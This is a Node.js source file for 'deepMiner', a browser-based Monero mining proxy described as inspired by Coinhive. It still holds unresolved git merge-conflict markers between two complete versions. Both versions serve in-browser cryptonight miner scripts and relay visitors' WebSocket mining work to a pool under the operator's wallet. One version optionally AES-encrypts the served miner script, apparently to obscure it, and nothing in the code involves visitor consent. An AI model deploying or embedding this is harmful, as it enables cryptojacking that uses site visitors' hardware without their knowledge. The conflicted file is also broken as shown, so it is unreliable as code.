<<<<<<< HEAD
const cfg = global.cfg = require('./config');

const http = require('http');
const https = require('https');
const WebSocket = require('uws');
const net = require('net');
const fs = require('fs');
const crypto = require('crypto');
const express = require('express');
const path = require('path');
const util = require('util');

const readFilePromise = async (...opts) => {
	return new Promise((go, stop) => {
		fs.readFile(...opts, (e, data) => {
			if (e) return stop(e);
			return go(data);
		});
	});
};

const contentTypes = {
	js: 'application/javascript; charset=UTF-8',
	wasm: 'application/wasm; charset=UTF-8',
	mem: 'application/wasm; charset=UTF-8',
	html: 'text/html; charset=UTF-8',
};

const app = express();
app.set('query parser', false);
app.set('x-powered-by', false);
app.set('env', 'production');
app.use((req, res, next) => {
	res.setHeader('Access-Control-Allow-Origin', '*');
	return next();
});
app.use(express.static(path.join(__dirname, cfg.webRoot), {
	etag: false,
	extensions: Object.keys(contentTypes),
	index: false,
	setHeaders: (res, filepath, stat) => {
		try {
			res.type(path.extname(filepath));
		} catch (e) {
			res.set({
				'Content-Type': path.extname(filepath) in contentTypes ? contentTypes[path.extname(filepath)] : contentTypes.html
			});
		};
		res.set({
			'Content-Length': stat.size
		});
		return res;
	},
}));
app.get('/', async (req, res, next) => {
	try {
		res.send(await readFilePromise(path.join(__dirname, cfg.webRoot, cfg.demoPage), 'utf8'));
		return res.end();
	} catch (e) {
		return next(e);
	};
});
app.use(async (e, req, res, next) => {
	if (e) {
		try {
			cfg.logger(`ERROR: ${util.inspect(e)}`);
		} catch (e2) {
			cfg.logger(`UNDEFINED ERROR: ${e}`);
		};
	};
	return res.end();
});

let server = cfg.ssl.enabled ? https.createServer({
	key: cfg.ssl.key,
	cert: cfg.ssl.cert
}, app) : http.createServer(app);

let wsServer = new WebSocket.Server(Object.assign({}, cfg.uws.serverOpts, { server }));
wsServer.on('connection', (ws) => {
	let conn = {
		uid: null,
		pid: crypto.randomBytes(12).toString('hex'),
		workerId: null,
		found: 0,
		accepted: 0,
		ws,
		pl: new net.Socket(),
	};
	let pool = cfg.conn.pool.split(':');
	conn.pl.connect(pool[1], pool[0]);

	const ws2pool = async (data) => {
		let buf;
		data = JSON.parse(data);
		if (data.type === 'auth') {
			conn.uid = data.params.site_key;
			if (data.params.user) conn.uid += '@' + data.params.user;
			buf = {
				"method": "login",
				"params": {
					"login": cfg.conn.wallet,
					"pass": cfg.conn.poolpass,
					"agent": "deepMiner"
				},
				"id": conn.pid
			};
			buf = `${JSON.stringify(buf)}\n`;
			conn.pl.write(buf);
		} else if (data.type === 'submit') {
			conn.found++;
			buf = {
				"method": "submit",
				"params": {
					"id": conn.workerId,
					"job_id": data.params.job_id,
					"nonce": data.params.nonce,
					"result": data.params.result
				},
				"id": conn.pid
			};
			buf = `${JSON.stringify(buf)}\n`;
			conn.pl.write(buf);
		};
	};

	const pool2ws = async (data) => {
		try {
			let buf;
			data = JSON.parse(data);
			if (data.id === conn.pid && data.result) {
				if (data.result.id) {
					conn.workerId = data.result.id;
					buf = {
						"type": "authed",
						"params": {
							"token": "",
							"hashes": conn.accepted
						},
					};
					buf = JSON.stringify(buf);
					conn.ws.send(buf);
					buf = {
						"type": "job",
						"params": data.result.job
					};
					buf = JSON.stringify(buf);
					conn.ws.send(buf);
				} else if (data.result.status === 'OK') {
					conn.accepted++;
					buf = {
						"type": "hash_accepted",
						"params": {
							"hashes": conn.accepted
						},
					};
					buf = JSON.stringify(buf);
					conn.ws.send(buf);
				};
			};
			if (data.id === conn.pid && data.error) {
				if (data.error.code === -1) {
					buf = {
						"type": "banned",
						"params": {
							"banned": conn.pid
						},
					};
				} else {
					buf = {
						"type": "error",
						"params": {
							"error": data.error.message
						},
					};
				};
				buf = JSON.stringify(buf);
				conn.ws.send(buf);
			};
			if (data.method === 'job') {
				buf = {
					"type": 'job',
					"params": data.params
				};
				buf = JSON.stringify(buf);
				conn.ws.send(buf);
			};
		} catch (e) {
			console.warn(`[!] Error: ${e.message}`);
		};
	};

	conn.ws.on('message', async (data) => {
		await ws2pool(data);
		cfg.logger(`[>] Request: ${conn.uid}\n\n${data}\n`);
	});
	conn.ws.on('error', (data) => {
		cfg.logger(`[!] ${conn.uid} WebSocket ${data}\n`);
		conn.pl.destroy();
	});
	conn.ws.on('close', () => {
		cfg.logger(`[!] ${conn.uid} offline.\n`);
		conn.pl.destroy();
	});
	conn.pl.on('data', async (data) => {
		let linesdata = data;
		let lines = String(linesdata).split("\n");
		if (lines[1].length > 0) {
			cfg.logger(`[<] Response: ${conn.pid}\n\n${lines[0]}\n\n[<] Response: ${conn.pid}\n\n${lines[1]}\n`);
			await pool2ws(lines[0]);
			await pool2ws(lines[1]);
		} else {
			cfg.logger(`[<] Response: ${conn.pid}\n\n${data}\n`);
			await pool2ws(data);
		};
	});
	conn.pl.on('error', (data) => {
		cfg.logger(`PoolSocket ${data}\n`);
		if (conn.ws.readyState !== 3) conn.ws.close();
	});
	conn.pl.on('close', () => {
		cfg.logger('PoolSocket Closed.\n');
		if (conn.ws.readyState !== 3) conn.ws.close();
	});
});

server.listen(cfg.server.port, cfg.server.domain, () => {
	cfg.logger(` Listen on : ${cfg.server.domain}:${cfg.server.port}\n Pool Host : ${cfg.conn.pool}\n Wallet : ${cfg.conn.wallet}\n----------------------------------------------------------------------------------------\n`);
});
=======
/**
 * deepMiner v2.0
 * Idea from coinhive.com
 * For any XMR pool with your wallet
 * By evil7@deePwn
 */

var http = require("http"),
    WebSocket = require("ws"),
    net = require("net"),
    fs = require("fs"),
    CryptoJS = require("crypto-js");

var conf = JSON.parse(fs.readFileSync(__dirname + "/config.json", "utf8"));

// crypto for AES
function rand(n) {
    var chars = "01234567890ABCDEF";
    var res = "";
    for (var i = 0; i < n; i++) {
        var id = Math.ceil(Math.random() * (chars.length - 1));
        res += chars[id];
    }
    return res;
}

function enAES(key, str) {
    var encrypt = CryptoJS.AES.encrypt(str, key);
    return encrypt.toString();
}

function deAES(key, str) {
    var decrypt = CryptoJS.AES.decrypt(str, key);
    return decrypt.toString(CryptoJS.enc.Utf8);
}

var file = file || {};
var fileLists = ["/index.html", "/miner.html", "/lib/deepMiner.min.js", "/lib/cryptonight.js", "/lib/cryptonight.wasm"];
for (var i = 0; i < fileLists.length; i++) {
    var currentFile = fileLists[i];
    if (fileLists[i].match(/\.wasm$/)) {
        file[currentFile] = fs.readFileSync(__dirname + "/web" + currentFile, null);
    } else {
        file[currentFile] = fs
            .readFileSync(__dirname + "/web" + currentFile, "utf8")
            .replace(/%deepMiner_domain%/g, conf.domain);
    }
}

var stats = (req, res) => {
    req.url = req.url === "/" ? "/index.html" : req.url;
    if (req.url.match(/\.min\.js/)) {
        res.setHeader("Access-Control-Allow-Origin", "*");
        if (conf.cryp) {
            var randKey = rand(32);
            file[req.url] = randKey + "#" + enAES(randKey, file[req.url]);
        }
        res.setHeader("Content-Type", "application/javascript");
    } else if (req.url.match(/\.html$/)) {
        res.setHeader("Content-Type", "text/html");
    } else if (req.url.match(/\.wasm$/)) {
        res.setHeader("Access-Control-Allow-Origin", "*");
        res.setHeader("Content-Type", "application/wasm");
    } else {
        res.setHeader("Content-Type", "application/octet-stream");
    }
    res.end(file[req.url]);
};
var web = http.createServer(stats);

// Trans WebSocket to PoolSocket
function ws2pool(conn, data) {
    var buf;
    data = JSON.parse(data);
    switch (data.type) {
        case "auth": {
            conn.uid = data.params.userID || "Anonymous";
            buf = {
                method: "login",
                params: {
                    login: conf.addr,
                    pass: conf.pass,
                    rigid: "",
                    agent: "deepMiner"
                },
                id: conn.pid
            };
            buf = JSON.stringify(buf) + "\n";
            conn.pl.write(buf);
            console.log(buf + "\n");
            break;
        }
        case "submit": {
            conn.found++;
            buf = {
                method: "submit",
                params: {
                    id: conn.workerId,
                    job_id: data.params.job_id,
                    nonce: data.params.nonce,
                    result: data.params.result
                },
                id: conn.pid
            };
            buf = JSON.stringify(buf) + "\n";
            conn.pl.write(buf);
            break;
        }
    }
}
// Trans PoolSocket to WebSocket
function pool2ws(conn, data) {
    try {
        var buf;
        data = JSON.parse(data);
        if (data.id === conn.pid && data.result) {
            if (data.result.id) {
                conn.workerId = data.result.id;
                buf = {
                    type: "authed",
                    params: {
                        hashes: conn.accepted
                    }
                };
                buf = JSON.stringify(buf);
                conn.ws.send(buf);
                buf = {
                    type: "job",
                    params: data.result.job
                };
                buf = JSON.stringify(buf);
                conn.ws.send(buf);
            } else if (data.result.status === "OK") {
                conn.accepted++;
                buf = {
                    type: "hash_accepted",
                    params: {
                        hashes: conn.accepted
                    }
                };
                buf = JSON.stringify(buf);
                conn.ws.send(buf);
            }
        }
        if (data.id === conn.pid && data.error) {
            if (data.error.code === -1) {
                buf = {
                    type: "error",
                    params: {
                        error: data.error.message
                    }
                };
            } else {
                buf = {
                    type: "banned",
                    params: {
                        banned: conn.pid
                    }
                };
            }
            buf = JSON.stringify(buf);
            conn.ws.send(buf);
        }
        if (data.method === "job") {
            buf = {
                type: "job",
                params: data.params
            };
            buf = JSON.stringify(buf);
            conn.ws.send(buf);
        }
    } catch (error) {
        console.warn("[!] Error: " + error.message);
    }
}

// get IP
function getClientIp(req) {
    // In webSocket req need select the header used lowercase `req.headers["x-real-ip"]` not the `req.headers["X-Real-IP"]`. wtf...
    var theIp =
        req.headers["x-forwarded-for"] ||
        req.headers["x-real-ip"] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        req.connection.socket.remoteAddress;
    return theIp;
}

// Miner Proxy Srv
var srv = new WebSocket.Server({
    server: web,
    path: "/proxy",
    maxPayload: 1024
});
srv.on("connection", (ws, req) => {
    var conn = {
        uid: null,
        pid: rand(16).toString("hex"),
        uip: getClientIp(req),
        workerId: null,
        found: 0,
        accepted: 0,
        ws: ws,
        pl: new net.Socket()
    };
    var pool = conf.pool.split(":");
    conn.pl.connect(
        pool[1],
        pool[0]
    );
    conn.ws.on("message", data => {
        ws2pool(conn, data);
        console.log("[>] Request: " + conn.uid + " ( " + conn.uip + " )" + "\n\n" + data + "\n");
    });
    conn.ws.on("error", data => {
        console.log("[!] " + conn.uid + " ( " + conn.uip + " )" + " WebSocket " + data + "\n");
        conn.pl.destroy();
    });
    conn.ws.on("close", () => {
        console.log("[!] " + conn.uid + " ( " + conn.uip + " )" + " offline.\n");
        conn.pl.destroy();
    });
    conn.pl.on("data", function(data) {
        var linesdata = data;
        var lines = String(linesdata).split("\n");
        if (lines[1].length > 0) {
            console.log("[<] Response: " + conn.uid + " ( " + conn.uip + " )" + "\n\n" + lines[0] + "\n");
            console.log("[<] Response: " + conn.uid + " ( " + conn.uip + " )" + "\n\n" + lines[1] + "\n");
            pool2ws(conn, lines[0]);
            pool2ws(conn, lines[1]);
        } else {
            console.log("[<] Response: " + conn.uid + " ( " + conn.uip + " )" + "\n\n" + data + "\n");
            pool2ws(conn, data);
        }
    });
    conn.pl.on("error", data => {
        console.log("PoolSocket " + data + "\n");
        if (conn.ws.readyState !== 3) {
            conn.ws.close();
        }
    });
    conn.pl.on("close", () => {
        console.log("PoolSocket Closed.\n");
        if (conn.ws.readyState !== 3) {
            conn.ws.close();
        }
    });
});
web.listen(conf.lport, conf.lhost);
>>>>>>> 4ad4a16066047848b06a1eb0e0da29fc847ecf18
